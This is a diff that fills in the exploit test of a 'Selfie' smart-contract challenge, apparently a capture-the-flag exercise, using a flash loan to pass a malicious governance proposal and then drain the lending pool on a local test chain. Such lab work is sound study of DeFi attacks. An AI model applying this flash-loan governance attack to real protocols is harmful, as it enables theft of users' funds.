@@ -31,6 +31,13 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackerProxyGovernanceFactory = await ethers.getContractFactory('AttackerProxyGovernance', attacker);
+        this.attackerProxy = await AttackerProxyGovernanceFactory.deploy(this.pool.address, this.token.address, this.governance.address);
+        // flash loan and make evil proposal to governance
+        await this.attackerProxy.evilProposal();
+        // Advance time 2 days so that we can draiiiinz
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await this.attackerProxy.drainPool();
     });
 
     after(async function () {
